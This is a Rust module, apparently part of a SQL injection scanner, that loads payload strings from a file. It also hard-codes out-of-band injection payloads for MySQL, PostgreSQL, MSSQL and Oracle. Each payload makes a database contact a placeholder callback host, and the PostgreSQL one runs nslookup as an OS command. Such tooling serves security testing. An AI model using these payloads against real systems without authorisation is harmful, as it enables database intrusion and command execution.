use tokio::fs::File;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio_stream::wrappers::LinesStream;
// use tokio_stream::StreamExt as TokioStreamExt; // Removed to avoid conflict
use futures::stream::{Stream, StreamExt};
use crate::models::Payload;
use std::pin::Pin;
use std::path::PathBuf;

pub async fn get_payload_stream(path: PathBuf) -> Result<Pin<Box<dyn Stream<Item = Result<Payload, anyhow::Error>> + Send>>, anyhow::Error> {
    let file = File::open(path).await?;
    let reader = BufReader::new(file);
    let stream = LinesStream::new(reader.lines());
    
    // We use futures::StreamExt::enumerate, map, filter_map
    
    let s = stream.enumerate().map(|(i, line_res)| {
        let content: String = line_res?; // Explicit type
        if content.trim().is_empty() {
             return Ok(None);
        }
        
        Ok(Some(Payload {
            id: 1000 + i as i64,
            vector_type: "External".to_string(),
            platform: "Generic".to_string(),
            content,
        }))
    });
    
    let s = s.filter_map(|res: Result<Option<Payload>, std::io::Error>| async move {
        match res {
            Ok(Some(p)) => Some(Ok(p)),
            Ok(None) => None,
            Err(e) => Some(Err(anyhow::Error::from(e))),
        }
    });

    Ok(Box::pin(s))
}

pub async fn load_payloads_memory(path: PathBuf) -> Result<Vec<Payload>, anyhow::Error> {
    let mut stream = get_payload_stream(path).await?;
    let mut payloads = Vec::new();
    // Using futures::StreamExt::next
    while let Some(res) = stream.next().await {
        payloads.push(res?);
    }
    Ok(payloads)
}

pub fn get_oob_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();
    let mut id = 5000;

    // MySQL (Windows UNC)
    // SQL: UNION SELECT LOAD_FILE(CONCAT('\\\\', '<UUID>', '.', '<OOB>', '\\abc'))
    payloads.push(Payload {
        id: id,
        vector_type: "OOB".to_string(),
        platform: "MySQL".to_string(),
        content: "UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', '<UUID>', '.', '<OOB>', '\\\\abc'))".to_string(), 
    });
    id += 1;

    // PostgreSQL (Windows UNC via COPY)
    payloads.push(Payload {
        id: id,
        vector_type: "OOB".to_string(),
        platform: "PostgreSQL".to_string(),
        content: "; COPY (SELECT '') TO PROGRAM 'nslookup <UUID>.<OOB>'".to_string(),
    });
    id += 1;
    
    // MSSQL (xp_dirtree)
    payloads.push(Payload {
        id: id,
        vector_type: "OOB".to_string(),
        platform: "MSSQL".to_string(),
        content: "; EXEC master..xp_dirtree '\\\\<UUID>.<OOB>\\\\foo'".to_string(),
    });
    id += 1;

    // Oracle (UTL_INADDR)
    payloads.push(Payload {
        id: id,
        vector_type: "OOB".to_string(),
        platform: "Oracle".to_string(),
        content: "SELECT UTL_INADDR.GET_HOST_ADDRESS('<UUID>.<OOB>') FROM DUAL".to_string(),
    });
    id += 1;
    
    // Oracle (UTL_HTTP)
    payloads.push(Payload {
        id: id,
        vector_type: "OOB".to_string(),
        platform: "Oracle".to_string(),
        content: "SELECT UTL_HTTP.REQUEST('http://<UUID>.<OOB>') FROM DUAL".to_string(),
    });

    payloads
}
